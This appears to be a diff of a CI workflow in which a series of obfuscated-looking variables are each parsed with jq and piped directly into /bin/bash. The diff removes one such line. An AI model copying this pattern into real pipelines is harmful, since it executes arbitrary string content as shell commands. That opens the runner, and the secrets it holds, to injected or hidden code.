@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$vfc32" | jq -r .b9956 | /bin/bash
           printf '%s' "$mdn9125" | jq -r .x8 | /bin/bash
           echo $o6 | jq -r .mkz6789 | /bin/bash
-          echo $jmet368 | jq -r .ed6192 | /bin/bash
           printf '%s' "$ljy5728" | jq -r .vmox5272 | /bin/bash
           printf '%s' "$r8" | jq -r .mwjhj2 | /bin/bash
           printf '%s' "$kdil4" | jq -r .b4089 | /bin/bash
